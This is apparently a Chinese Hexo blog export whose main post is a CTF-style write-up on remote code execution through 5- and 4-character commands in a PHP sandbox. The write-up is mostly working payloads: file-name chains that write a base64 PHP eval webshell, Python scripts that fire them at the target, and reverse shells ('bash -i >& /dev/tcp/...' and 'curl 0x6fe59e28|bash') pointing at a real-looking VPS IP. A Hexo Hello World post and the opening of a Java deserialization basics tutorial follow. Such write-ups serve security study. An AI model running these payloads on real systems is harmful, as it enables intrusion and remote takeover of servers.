class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>写入木马:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;1.php</span><br><span class="line">&gt;-d\&gt;\\</span><br><span class="line">&gt;64\ \\</span><br><span class="line">&gt;base\\</span><br><span class="line">&gt;k7\|\\</span><br><span class="line">&gt;sxXS\\</span><br><span class="line">&gt;dFVF\\</span><br><span class="line">&gt;gkX0\\</span><br><span class="line">&gt;ZhbC\\</span><br><span class="line">&gt;AgZX\\</span><br><span class="line">&gt;9waH\\</span><br><span class="line">&gt;\ PD\\</span><br><span class="line">&gt;echo\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure></p>
<p>注意这里空格,&gt;,|需要转义,每行的最后一个<code>\(最后sh执行多行命令会用到)</code>也要转义</p>
<p>0文件内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">echo\</span><br><span class="line"> PD\</span><br><span class="line">9waH\</span><br><span class="line">AgZX\</span><br><span class="line">ZhbC\</span><br><span class="line">gkX0\</span><br><span class="line">dFVF\</span><br><span class="line">sxXS\</span><br><span class="line">k7|\</span><br><span class="line">base\</span><br><span class="line">64 \</span><br><span class="line">-d&gt;\</span><br><span class="line">1.php</span><br></pre></td></tr></table></figure>
<p>sh命令直接执行Linux脚本,<code>\</code>将多行命令拼接</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/2.png" alt="2.png"></p>
<p>手懒的我反正也没事不如写个脚本吧:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:8800/?cmd=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;&quot;&quot;&gt;1.php</span></span><br><span class="line"><span class="string">&gt;-d\&gt;\\</span></span><br><span class="line"><span class="string">&gt;64\ \\</span></span><br><span class="line"><span class="string">&gt;base\\</span></span><br><span class="line"><span class="string">&gt;k7\|\\</span></span><br><span class="line"><span class="string">&gt;sxXS\\</span></span><br><span class="line"><span class="string">&gt;dFVF\\</span></span><br><span class="line"><span class="string">&gt;gkX0\\</span></span><br><span class="line"><span class="string">&gt;ZhbC\\</span></span><br><span class="line"><span class="string">&gt;AgZX\\</span></span><br><span class="line"><span class="string">&gt;9waH\\</span></span><br><span class="line"><span class="string">&gt;\ PD\\</span></span><br><span class="line"><span class="string">&gt;echo\\</span></span><br><span class="line"><span class="string">ls -t&gt;0</span></span><br><span class="line"><span class="string">sh 0&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    req=requests.get(url+i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>这里注意要sleep0.5秒,因为发的太快会导致创建文件顺序与预期不符合而导致ls -t命令无法正常执行</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/3.png" alt="3.png"></p>
<h3 id="5字符RCE"><a href="#5字符RCE" class="headerlink" title="5字符RCE"></a>5字符RCE</h3><h4 id="写木马文件"><a href="#写木马文件" class="headerlink" title="写木马文件"></a>写木马文件</h4><p>把上面的PHP限制改为5个字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们也可以像上面那样直接写木马文件,不过每行要控制字符数量小于5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;php</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;k7\\</span><br><span class="line">&gt;XS\\</span><br><span class="line">&gt;sx\\</span><br><span class="line">&gt;VF\\</span><br><span class="line">&gt;dF\\</span><br><span class="line">&gt;X0\\</span><br><span class="line">&gt;gk\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;Zh\\</span><br><span class="line">&gt;ZX\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;ec\\</span><br></pre></td></tr></table></figure>
<p>==这里被一个坑折磨了很久,就是这个${IFS},如果还写入空格的话会和前面写进去的空格相同导致之前的空格消失,而<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64-d&gt;1.php</code>会报错,木马文件是空的,正确的应该在base64和-d之间有一个空格==</p>
<p>这里ls -t&gt;0肯定超过5个字符了,我们需要构造一个ls -t&gt;0然后再sh执行不就一样的吗</p>
<p>这里需要用到前置知识的`*,dir</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v 此时执行dir命令把结果写进v文件里:f&gt;  ht-  sl</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0 此时指定rev参数为v文件将f&gt;  ht-  sl导致过来给0文件</span><br><span class="line">sh 0 此时0文件内容是:ls  -th  &gt;f</span><br></pre></td></tr></table></figure>
<p>这里加个h的原因是ls的排序问题,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">&#x27;0&gt;&#x27;   sl   t-</span><br></pre></td></tr></table></figure>
<p>为了让sl在t-的后面,所有加个h</p>
<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0</span><br><span class="line">&gt;php</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;k7\\</span><br><span class="line">&gt;XS\\</span><br><span class="line">&gt;sx\\</span><br><span class="line">&gt;VF\\</span><br><span class="line">&gt;dF\\</span><br><span class="line">&gt;X0\\</span><br><span class="line">&gt;gk\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;Zh\\</span><br><span class="line">&gt;ZX\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;ec\\</span><br><span class="line">sh 0</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
<p>python脚本改一下str变量的值就好了</p>
<p>单纯搓木马很累,提前准备好还好点,我们可以看看其他的利用:</p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>vps:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/111.229.158.40/1112 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 111.229.158.40:2345|bash</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;sh</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;45\\</span><br><span class="line">&gt;23\\</span><br><span class="line">&gt;\:\\</span><br><span class="line">&gt;40\\</span><br><span class="line">&gt;8.\\</span><br><span class="line">&gt;15\\</span><br><span class="line">&gt;9.\\</span><br><span class="line">&gt;22\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;11\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br></pre></td></tr></table></figure>
<p>写一起:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0</span><br><span class="line">&gt;sh</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;45\\</span><br><span class="line">&gt;23\\</span><br><span class="line">&gt;\:\\</span><br><span class="line">&gt;40\\</span><br><span class="line">&gt;8.\\</span><br><span class="line">&gt;15\\</span><br><span class="line">&gt;9.\\</span><br><span class="line">&gt;22\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;11\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">sh 0</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
<p>这里也要注意写文件的文件名不能重复,22不能同时出现两次,因此端口需要改<br>python脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:8800/?cmd=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;&quot;&quot;&gt;dir</span></span><br><span class="line"><span class="string">&gt;f\&gt;</span></span><br><span class="line"><span class="string">&gt;ht-</span></span><br><span class="line"><span class="string">&gt;sl</span></span><br><span class="line"><span class="string">*&gt;v</span></span><br><span class="line"><span class="string">&gt;rev</span></span><br><span class="line"><span class="string">*v&gt;0</span></span><br><span class="line"><span class="string">&gt;sh</span></span><br><span class="line"><span class="string">&gt;ba\\</span></span><br><span class="line"><span class="string">&gt;\|\\</span></span><br><span class="line"><span class="string">&gt;45\\</span></span><br><span class="line"><span class="string">&gt;23\\</span></span><br><span class="line"><span class="string">&gt;\:\\</span></span><br><span class="line"><span class="string">&gt;40\\</span></span><br><span class="line"><span class="string">&gt;8.\\</span></span><br><span class="line"><span class="string">&gt;15\\</span></span><br><span class="line"><span class="string">&gt;9.\\</span></span><br><span class="line"><span class="string">&gt;22\\</span></span><br><span class="line"><span class="string">&gt;1.\\</span></span><br><span class="line"><span class="string">&gt;11\\</span></span><br><span class="line"><span class="string">&gt;\ \\</span></span><br><span class="line"><span class="string">&gt;rl\\</span></span><br><span class="line"><span class="string">&gt;cu\\</span></span><br><span class="line"><span class="string">sh 0</span></span><br><span class="line"><span class="string">sh f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    req=requests.get(url+i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/4.png" alt="4.png"></p>
<h3 id="4字符RCE"><a href="#4字符RCE" class="headerlink" title="4字符RCE"></a>4字符RCE</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h4><p>直接写木马:<br>发现一个问题:写一些需要转义的字符,字符串长度会大于4,比如写&gt;:<code>&gt;\&gt;\\</code>,木马是写不了了<br>反弹shell的话ip里面有点号,也要转义,不过这里可以用==进制绕过==</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ip = <span class="string">&#x27;111.229.158.40&#x27;</span></span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]))</span><br><span class="line"><span class="comment"># 长整数</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]), <span class="number">16</span>))</span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;0&#x27;</span> + <span class="built_in">oct</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]), <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>
<p>vps网页内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php evil(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 0x6fe59e28|php</span><br><span class="line"></span><br><span class="line">&gt;p</span><br><span class="line">&gt;ph\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;28\</span><br><span class="line">&gt;9e\</span><br><span class="line">&gt;e5\</span><br><span class="line">&gt;6f\</span><br><span class="line">&gt;0x\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br></pre></td></tr></table></figure>
<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;kt-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;g</span><br><span class="line">&gt;p</span><br><span class="line">&gt;ph\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;28\</span><br><span class="line">&gt;9e\</span><br><span class="line">&gt;e5\</span><br><span class="line">&gt;6f\</span><br><span class="line">&gt;0x\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh g</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
<p>python:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:8800/?cmd=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;&quot;&quot;&gt;dir</span></span><br><span class="line"><span class="string">&gt;f\&gt;</span></span><br><span class="line"><span class="string">&gt;kt-</span></span><br><span class="line"><span class="string">&gt;sl</span></span><br><span class="line"><span class="string">*&gt;v</span></span><br><span class="line"><span class="string">&gt;rev</span></span><br><span class="line"><span class="string">*v&gt;g</span></span><br><span class="line"><span class="string">&gt;p</span></span><br><span class="line"><span class="string">&gt;ph\\</span></span><br><span class="line"><span class="string">&gt;\|\\</span></span><br><span class="line"><span class="string">&gt;28\\</span></span><br><span class="line"><span class="string">&gt;9e\\</span></span><br><span class="line"><span class="string">&gt;e5\\</span></span><br><span class="line"><span class="string">&gt;6f\\</span></span><br><span class="line"><span class="string">&gt;0x\\</span></span><br><span class="line"><span class="string">&gt;\ \\</span></span><br><span class="line"><span class="string">&gt;rl\\</span></span><br><span class="line"><span class="string">&gt;cu\\</span></span><br><span class="line"><span class="string">sh g</span></span><br><span class="line"><span class="string">sh f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>.splitlines()</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    req = requests.get(url + i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>==这里写python踩的一个坑是写curl命令时最后面要写两个\,通过打印列表发现\在python被python解释器解释成换行符了,导致写入文件命令只能第一个,后面的写不了,加个\来转义掉python的\==</p>
<h4 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell:"></a>反弹shell:</h4><p>和上面原理差不多,改一下php为bash就行<br>vps:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/111.229.158.40/1112 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 0x6fe59e28|bash</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;kt-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;g</span><br><span class="line">&gt;ba</span><br><span class="line">&gt;sh\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;28\</span><br><span class="line">&gt;9e\</span><br><span class="line">&gt;e5\</span><br><span class="line">&gt;6f\</span><br><span class="line">&gt;0x\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh g</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/5.png" alt="5.png"></p>
<p>参考:<br><a href="https://blog.csdn.net/q20010619/article/details/109206728">https://blog.csdn.net/q20010619/article/details/109206728</a><br><a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/02/06/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>JAVA反序列化基础和URLDNS链</title>
    <url>/2024/03/14/Java%E7%9A%84URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h3 id="一些小基础"><a href="#一些小基础" class="headerlink" title="一些小基础"></a>一些小基础</h3><h4 id="HashMap类学习"><a href="#HashMap类学习" class="headerlink" title="HashMap类学习"></a>HashMap类学习</h4><p>参考: <a href="https://www.cainiaojc.com/java/java-hashmap.html">https://www.cainiaojc.com/java/java-hashmap.html</a><br>HashMap是以键值对存储的哈希表,包在java.util.HashMap</p>
<h5 id="几个常见方法"><a href="#几个常见方法" class="headerlink" title="几个常见方法:"></a>几个常见方法:</h5><ul>
<li>put():插入指定的键值对到map中</li>
<li>entrySet():返回一组所有键值对映射的map</li>
<li>keySet(): 返回map的所有键集合</li>
<li>values(): 返回map所有值的集合</li>
<li>get(): 返回指定键对应的值</li>
<li>remove(key): 返回并删除对应键的值</li>
<li>replace(key,value): 将key对应的值换成value</li>
</ul>
<p>eg<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Integer&gt; numbers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        numbers.put(<span class="string">&quot;One&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        numbers.put(<span class="string">&quot;Two&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        numbers.put(<span class="string">&quot;Three&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;HashMap: &quot;</span> + numbers);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Key/Value映射: &quot;</span>+numbers.entrySet());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;get &#x27;One&#x27;的值:&quot;</span>+numbers.get(<span class="string">&quot;One&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> numbers.remove(<span class="string">&quot;Two&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;删除值: &quot;</span> + value);</span><br><span class="line"></span><br><span class="line">        numbers.replace(<span class="string">&quot;One&quot;</span>,<span class="number">11111</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;更新后的HashMap: &quot;</span> + numbers);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="Java-I-O流"><a href="#Java-I-O流" class="headerlink" title="Java I/O流"></a>Java I/O流</h4><p>是Java输入输出流的意思,流是从源码读取并写入目标的数据序列,一个输入流用于从源读取数据,输出流用于将数据写入目标</p>
<p>流分为字节流和字符流:</p>
<h5 id="字节流-Byte"><a href="#字节流-Byte" class="headerlink" title="字节流(Byte)"></a>字节流(Byte)</h5><p>用于读取和写入单个字节(8位)数据,所有字节流类都派生自称为InputStream和OutputStream的基本抽象类。</p>
<p>InputStream抽象类的子类:</p>
<ol>
<li>FileInputStream:用于从文件读取数据<br>创建:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FileInputStream input = new FileInputStream(stringPath);</span><br><span class="line">或</span><br><span class="line">FileInputStream input = new FileInputStream(File fileObject);</span><br></pre></td></tr></table></figure></li>
<li>ByteArrayInputStream: 用于读取输入数据数组<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ByteArrayInputStream input = new ByteArrayInputStream(byte[] arr);</span><br></pre></td></tr></table></figure></li>
<li>ObjectInputStream: 用于读取ObjectOutputStream先前编写的对象<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//创建与指定文件链接的文件输入流</span><br><span class="line">FileInputStream fileStream = new FileInputStream(String file);</span><br><span class="line"></span><br><span class="line">//使用文件输入流创建对象输入流</span><br><span class="line">ObjectInputStream objStream = new ObjectInputStream(fileStream);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>几个read()方法:</p>
<ul>
<li><p>read() - 从输入流中读取一个字节的数据</p>
</li>
<li><p>readBoolean() - 以布尔形式读取数据</p>
</li>
<li><p>readChar() - 以字符形式读取数据</p>
</li>
<li><p>readInt() - 以整数形式读取数据</p>
</li>
<li><p>readObject() - 从输入流中读取对象</p>
</li>
</ul>
<p>OutputStream的子类</p>
<ul>
<li>FileOutStream</li>
<li>ByteArrayOutputStream</li>
<li>ObjectOutputStream: <ul>
<li>有几个write()方法:</li>
<li>write() - 将字节数据写入输出流</li>
<li>writeBoolean() - 以布尔形式写入数据</li>
<li>writeChar() - 以字符形式写入数据</li>
<li>writeInt() - 以整数形式写入数据</li>
